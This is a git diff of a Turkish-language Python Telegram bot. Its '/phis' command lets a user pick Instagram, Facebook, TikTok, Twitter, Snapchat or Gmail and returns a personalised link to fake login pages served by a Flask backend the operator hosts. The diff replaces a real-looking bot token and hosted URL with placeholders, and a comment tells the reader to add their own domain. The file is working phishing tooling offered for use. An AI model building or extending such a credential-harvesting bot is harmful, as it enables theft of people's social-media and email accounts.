@@ -1,12 +1,11 @@
-# Platform seçim butonları
 import telebot
 from telebot import types
 
 # Bot token'ınızı buraya yazın
-BOT_TOKEN = '6734341420:AAHZK3L1nXLzMGVYdYLatLiBgk1Vj430bCs'
+BOT_TOKEN = '1234567890:qwertyuıoğüğpoıuytrewasdfghjklşiiqwertyuıopğü'
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Kullanıcıların durumlarını takip etmek için bir sözlük
+
 user_states = {}
 
 # /phis komutu
@@ -18,19 +17,19 @@ def phis_command(message):
             "❌ Bu komut yalnızca özel sohbetlerde kullanılabilir. Lütfen bana doğrudan mesaj gönderin."
         )
         return
-    # Kullanıcı klavyesi oluştur
+
     keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
     keyboard.add("Instagram 📸", "Facebook 👍", "TikTok 🎵")
     keyboard.add("Twitter 🐦", "Snapchat 👻", "Gmail 📧")
-    keyboard.add("Geri ↩️")  # Geri butonu alt tarafa eklendi
+    keyboard.add("Geri ↩️")  
     
-    # Mesaj gönder
+
     bot.send_message(
         message.chat.id,
         "Hangi platformdan giriş yapmak istiyorsunuz?",
         reply_markup=keyboard
     )
-    # Kullanıcının durumunu ayarla
+
     user_states[message.chat.id] = "waiting_for_selection"
 
 # Mesajlara tepki verme
@@ -42,17 +41,17 @@ def handle_buttons(message):
         return
     
     if message.text == "Geri ↩️":
-        # Geri butonuna basıldığında klavyeyi gizle
+     
         bot.send_message(
             message.chat.id,
             "Seçim iptal edildi. Tekrar platform seçmek için /phis komutunu yazabilirsiniz.",
             reply_markup=types.ReplyKeyboardRemove()
         )
-        # Kullanıcının durumunu sıfırla
+
         user_states.pop(message.chat.id, None)
     else:
-        # Platform seçildiğinde, link oluştur ve kullanıcı ID'sini ekle
-        base_url = "https://8080-ie72mdtz5i4l4fohvnkw7-8809fef5.manusvm.computer/login/"
+        # flesk modülünü çalıştırdığınız bağlantıyı braya ekleyin bir domaine bağlamanız tavsiye edilir
+        base_url = "https://domaınınızıburayaekleyın/login/"
         platform_links = {
             "Instagram 📸": f"{base_url}instagram/{message.chat.id}",
             "Facebook 👍": f"{base_url}facebook/{message.chat.id}",
@@ -68,7 +67,7 @@ def handle_buttons(message):
             f"Platform linkiniz: {selected_link}\n\nLinki."
         )
 
-# Botu başlat
+
 if __name__ == '__main__':
     print("Bot başlatılıyor...")
     bot.polling()
